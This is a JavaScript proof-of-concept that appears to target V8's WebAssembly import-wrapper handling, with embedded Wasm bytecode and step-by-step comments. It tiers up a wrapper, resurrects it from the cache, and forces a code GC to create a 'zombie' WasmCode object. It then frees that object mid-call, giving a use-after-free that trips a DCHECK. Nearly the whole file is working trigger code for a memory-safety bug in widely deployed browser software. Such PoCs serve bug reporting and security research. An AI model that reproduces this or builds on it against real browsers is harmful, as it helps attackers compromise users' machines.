/*
    (module
        (import "js" "table" (table 1 funcref))
    
        (type $sig (func (param i32)))
    
        (func $cb (import "js" "cb") (param i32))
        (export "cb" (func $cb))

        (func (export "warmup_cb")
            i32.const 1 ;; warmup flag
            i32.const 0
            call_indirect (type $sig)
        )

        (func (export "exploit")
            i32.const 0 ;; warmup flag
            i32.const 0
            call_indirect (type $sig)
        )
    )
*/
const WASM_CODE = new Uint8Array([0,97,115,109,1,0,0,0,1,8,2,96,1,127,0,96,0,0,2,22,2,2,106,115,2,99,98,0,0,2,106,115,5,116,97,98,108,101,1,112,0,1,3,3,2,1,1,7,28,3,9,119,97,114,109,117,112,95,99,98,0,1,7,101,120,112,108,111,105,116,0,2,2,99,98,0,0,10,21,2,9,0,65,1,65,0,17,0,0,11,9,0,65,0,65,0,17,0,0,11]);

let wasm_table = new WebAssembly.Table({ initial: 1, element: "anyfunc" });

let wasm_inst = new WebAssembly.Instance(new WebAssembly.Module(WASM_CODE), {
    "js": {
        "table": wasm_table,
        "cb": cb,
    }
})
let { cb: wasm_cb, warmup_cb, exploit } = wasm_inst.exports;

//Tier up the import wrapper; this will compile a new Wasm2JS wrapper, which is inserted into the import wrapper cache
wasm_table.set(0, wasm_cb);
for(let i = 0; i < 10000; i++) warmup_cb();

//Replace the dispatch table reference with a generic wrapper reference
//This drops the refcount of the tiered up import wrapper to 0, adding it to potentially_dead_code_ while leaving it in the import wrapper cache
wasm_table.set(0, null);

//Resurrect the wrapper from the import cache, incrementing its refcount again
//Do this by triggering another tierup; Runtime_TierUpWasmToJSWrapper won't compile a new tiered-up wrapper since the old one is still in the cache
wasm_table.set(0, wasm_cb);
for(let i = 0; i < 10000; i++) warmup_cb();

//Run a Wasm code GC
//This will try to free the resurrected wrapper, but it will bail out early since the refcount has been increased since then
//However, it still adds the wrapper to dead_code_, turning it into a zombie WasmCode object
console.log("pre Wasm code GC");

// - contains a giant method so that the unoptimized Liftoff method becoming dead triggers a Wasm code GC
/*
    (module
        (func (export "func") (result f64)
            (local $l f64)

            ;; - repeat 30000 times
            (local.set $l (f64.add (local.get $l) (local.get $l)))
            ...

            local.get $l
        )
    )
*/
let gc_code = [0,97,115,109,1,0,0,0,1,5,1,96,0,1,124,3,2,1,0,7,8,1,4,102,117,110,99,0,0,10,218,232,12,1,214,232,12,1,1,124];
for(let i = 0; i < 30000; i++) gc_code.push(32,0,32,0,160,33,0);
gc_code.push(32,0,11);

let gc_inst = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array(gc_code)));
let gc_func = gc_inst.exports.func;
for(let i = 0; i < 100000; i++) gc_func();

console.log("post Wasm code GC");

//Exploit this "zombie" state by freeing the wrapper while it is still being used
function cb(warmup) {
    if(warmup) return;
    console.log("cb entry");
    
    //Drop the refcount of the zombie wrapper to zero
    //Since it is in the dead_code_ set, this will immediately free it, even though the wrapper is still being used!
    wasm_table.set(0, null);

    //We're in a really bad state now; we'll return to a freed JIT allocation after this function
    //This is not directly exploitable because Wasm code allocations are never reused, but this might change in the future
    //However, the bug is still exploitable; by freeing the zombie wrapper outside of a GC the isolate's code lookup cache is not cleared, even though the WasmCode instance has been freed!
    //The easiest way to demonstrate that something is wrong is to trigger a regular GC
    //`StackFrameIterator::ComputeStackFrameType` will try to look up the WasmCode* for the UaF stack frame, which trips a DCHECK in the WasmCodeLookupCache
    console.log("triggering GC to trip DCHECK");
    for(let i = 0; i < 1000; i++) new ArrayBuffer(0x100000);

    //We shouldn't get here
    console.log("cb exit???");
}

exploit();